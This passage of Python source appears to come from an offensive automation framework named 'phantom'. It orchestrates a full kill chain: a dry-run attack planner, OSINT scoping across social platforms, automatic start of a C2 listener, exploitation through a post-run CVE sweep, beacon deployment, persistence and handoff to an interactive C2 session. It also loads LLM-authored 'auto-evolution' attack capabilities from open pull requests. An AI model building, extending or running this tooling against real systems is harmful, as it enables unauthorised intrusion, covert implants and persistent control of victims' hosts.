    if plan:
        # the dry run must not read as unscoped while a pinned scope is set:
        # the OSINT pass is exactly where the choice changes the steps.
        if social_platform:
            from phantom.automation.social.recon import normalize_scope
            _sc, _sp = normalize_scope(social_platform)
            if _sc == "pin":
                _scope_txt = (f"PINNED to {_sp} — the other platforms are "
                              f"not probed")
            elif _sc == "other":
                _scope_txt = ("everywhere EXCEPT the 5 top socials "
                              "(instagram, tiktok, x, github, telegram)")
            else:
                _scope_txt = "every platform is probed (auto)"
            console.print(f"[dim]OSINT scope: {_scope_txt}[/]")
        for t in resolved:
            p, tt, chain, _goal_facts = _dry_run_plan(
                t, goal, profile, aggressive, stealth, speed)
            console.print(f"\n[bold cyan]{t}[/] ({tt}, {chain} chain)")
            if not p.steps:
                console.print("  [dim](goal already satisfied, or no path)[/]")
            else:
                for i, s in enumerate(p.steps, 1):
                    console.print(
                        f"  {i}. [white]{s.capability.id}[/] "
                        f"[dim](cost {s.capability.opsec_cost}, "
                        f"{s.capability.stealth_level})[/] — {s.reason}")
        notifier.info("Dry run complete: no action was executed.")
        return

    # Fully automatic kill chain: the C2 listener must be up BEFORE any
    # beacon deploy so a deployed beacon has somewhere to check in. The
    # operator never has to start it manually — _ensure_c2_listener brings
    # its own listener (HTTPS + auto-generated mTLS material) unless
    # c2.listener_auto_start is off, binding c2.bind (every interface by
    # default) and dialing the derived beacon-facing address.
    _listener_up = _ensure_c2_listener()
    if not _listener_up and _needs_callback(goal) \
            and not _listenerless_allowed():
        # P0 FAIL-CLOSED. A callback-bound goal with no listener can only
        # deploy beacons that have nowhere to check in: the run would work
        # the whole chain and end on a late "no beacon established". The
        # prerequisite is knowable NOW, so the run refuses BEFORE the deploy
        # and names the cause — the job lifecycle says `failed`, the
        # engagement outcome says `blocked_preflight`.
        return _blocked_preflight(
            goal, resolved,
            f"no C2 listener and goal '{goal}' depends on a callback: the "
            f"run is refused BEFORE deploying (no engagement wasted).",
            "start the listener (`c2` -> listeners start) or free "
            "c2.bind/port; to start it by hand afterwards set "
            "c2.allow_listenerless=true (or PHANTOM_ALLOW_LISTENERLESS=1)",
            on_event)

    started_wall = time.time()
    out_root = resume or _report_out_dir()
    if resume:
        # resuming: reuse the checkpoint's own directory for reports so the
        # engagement artifacts stay together
        out_root = os.path.dirname(os.path.abspath(resume))
    if evolution or beta:
        # self-improvement / beta: both are gated on the LLM transport and
        # the lab (no proof, no authoring, no beta load) — surface early.
        _note = []
        if evolution and not llm:
            _note.append("--evolution requires --llm (the author IS the "
                         "LLM): flag ignored")
        if beta:
            _note.append("--beta: capabilities from the open auto-evolution "
                         "PRs are loaded after the gate (lab included)")
        for n in _note:
            notifier.warn(n)

    if beta:
        # fetch open auto-evolution PRs, gate them locally (lab included)
        # and stage what passes — every agent registry built after this
        # point includes the beta capabilities for THIS session only.
        try:
            from phantom.automation.evolution import beta as _beta_mod
            _b = _beta_mod.load_beta(
                emit=lambda _kind, **d: notifier.info(
                    f"[beta] {d.get('detail', _kind)}"))
            if _b.checked == 0:
                notifier.info("[beta] no open auto-evolution PR")
        except Exception as _exc:
            notifier.warn(f"[beta] load failed: {_exc}")

    # ONE goal table decides the engine (goals.GOALS: facts + chain +
    # engine): --engine swarm is honored for goals that DECLARE a
    # swarm chain, anything else falls back to the agent path with a
    # note (honest, not silent).
    engine, engine_note = _engine_for(goal, engine)
    if engine_note:
        notifier.warn(engine_note)
    if exploit_all and engine == "swarm":
        # The exploit sweep needs the agent's WorldModel and the post-run
        # beacon re-plan; the swarm engine returns a different artifact.
        # Route the explicit flag to the engine that can honor it. This is
        # announced, never silent.
        notifier.warn(
            "--exploit-all executes on the agent path: switching engine "
            "from swarm to agent for this run (the swarm already ran its "
            "own task execution and has no post-run CVE sweep).")
        engine = "agent"
    # the OSINT scope (--platform / the UI checkbox) is an AGENT-path input:
    # say so rather than let a swarm run look scoped when it is not.
    if social_platform and engine == "swarm":
        notifier.warn(
            "--platform scopes the agent OSINT pass (pin/other): the swarm "
            "engine does not consume it in this run.")

    if len(resolved) == 1:
        if engine == "swarm":
            return _run_swarm_branch(
                resolved, goal, profile, aggressive, speed, agents,
                verbose, on_event, llm, out_root, started_wall, handoff_c2,
                resilient_stager, resume, experience, evolution)
        state_path = resume or os.path.join(out_root, "checkpoint.json")
        result, agent = _run_agent_single(
            resolved[0], goal, profile, aggressive, stealth, speed,
            scope_list, agents, verbose, on_event, llm,
            state_path=state_path, experience=_experience_enabled(experience),
            evolution=evolution, stop_event=stop_event,
            reason_profile=reason_profile, cell_loop=cell_loop,
            cell_stages=cell_stages, resilient_stager=resilient_stager,
            identity_active=identity_active,
            evolution_mode=("proposal" if only_markdown else "code"),
            social_platform=social_platform)
        exploit_summary = {}
        if exploit_all and not plan:
            exploit_summary = _exploit_all_after_run(
                agent, goal, state_path, result)
            if exploit_summary.get("beacon_after"):
                # The rerun established a beacon through the verified RCE.
                # Carry those facts into the envelope the rest of automode
                # (outcome, handoff, report) already consumes.
                for _key in ("beacon_established", "beacon_id",
                             "beacon_count", "persistence_installed",
                             "beacon_injected", "actions_taken"):
                    if _key in agent.result:
                        result[_key] = agent.result[_key]
        if exploit_summary:
            result["exploit_all"] = exploit_summary
        tdir, paths = _write_agent_reports(agent, profile, out_root, resolved[0])
        # auto-mode -> manual core: everything the agent learned is merged
        # into the session + manual WorldModel, so `map`, `suggest`,
        # `exploit`, `payload` and the report all see the same truth.
        _merged = _merge_results_to_session(agent, resolved[0])
        if _merged:
            notifier.info(
                "Core sync: " + ", ".join(
                    f"{k}={v}" for k, v in sorted(_merged.items())) +
                " (now visible in the manual core too)")
        _print_agent_single_tail(result, paths, agent, goal,
                                 started_wall, out_root)
        # P0: the PROCESS finished — say whether the GOAL finished with it.
        # Announced BEFORE the handoff opens an interactive shell, so the
        # operator reads the verdict and not just a prompt.
        _outcome = _derive_target_outcome(
            goal, result,
            cancelled=bool(stop_event is not None and stop_event.is_set()))
        _announce_outcome(goal, _outcome, resolved[0], result, on_event)
        if result.get("beacon_established"):
            beacon_id = result.get("beacon_id") or ""
            if handoff_c2:
                _handoff_c2(beacon_id)
            elif on_event is not None:
                on_event("handoff", {"beacon_id": beacon_id})
        else:
            notifier.warn("No beacon established: nothing to hand off. "
                          "Use 'c2' -> 'beacons' to monitor callbacks")
        return _derive_engagement(goal, {resolved[0]: _outcome})

    if engine == "swarm":
        return _run_swarm_branch(
            resolved, goal, profile, aggressive, speed, agents,
            verbose, on_event, llm, out_root, started_wall, handoff_c2,
            resilient_stager, resume, experience, evolution)
    campaign = _run_agent_campaign(
        resolved, goal, profile, aggressive, stealth, speed,
        scope_list, agents, verbose, on_event, llm,
        state_dir=out_root, experience=_experience_enabled(experience),
        evolution=evolution, identity_active=identity_active,
        stop_event=stop_event, social_platform=social_platform)
    if exploit_all and not plan:
        _all = campaign.setdefault("exploit_all", {})
        for _t in resolved:
            _agent = campaign.get("_agents", {}).get(_t)
            if _agent is None:
                continue
            _summary = _exploit_all_after_run(
                _agent, goal, "", campaign.get("results", {}).get(_t, {}))
            _all[_t] = _summary
            if _summary.get("beacon_after"):
                _entry = campaign.setdefault("results", {}).setdefault(_t, {})
                for _key in ("beacon_established", "beacon_id",
                             "beacon_count", "persistence_installed",
                             "beacon_injected", "actions_taken"):
                    if _key in getattr(_agent, "result", {}):
                        _entry[_key] = _agent.result[_key]
    elapsed = _fmt_elapsed(time.time() - started_wall)
    per_target = {}
    for t in resolved:
        a = campaign.get("_agents", {}).get(t)
        if a is not None:
            tdir, paths = _write_agent_reports(a, profile, out_root, t)
            merge_agent_into_session(a, t)
            per_target[t] = {"dir": tdir, **paths}
    from phantom.automation.reporting import CampaignReport, ReportWriter
    cpaths = ReportWriter(out_root).write_campaign(
        CampaignReport(campaign, profile, per_target))
    _print_campaign_tail(campaign, per_target, cpaths, elapsed)
    first_beacon = ""
    for r in campaign.get("results", {}).values():
        if r.get("beacon_established") and not first_beacon:
            first_beacon = r.get("beacon_id", "")
    # P0: per-target outcomes, then the engagement-level answer. A campaign
    # that delivered on one host out of five is `partial`, never
    # `completed_goal`.
    _results = campaign.get("results", {}) if isinstance(campaign, dict) else {}
    _cancelled = bool(stop_event is not None and stop_event.is_set())
    _per_outcome = {t: _derive_target_outcome(
        goal, _results.get(t, {}), cancelled=_cancelled)
        for t in resolved}
    for _t in resolved:
        _announce_outcome(goal, _per_outcome[_t], _t,
                          _results.get(_t, {}), on_event)
    if first_beacon:
        if handoff_c2:
            _handoff_c2(first_beacon)
        elif on_event is not None:
            on_event("handoff", {"beacon_id": first_beacon})
    else:
        notifier.info("No beacon established. Use 'c2' to monitor.")
    return _derive_engagement(goal, _per_outcome)
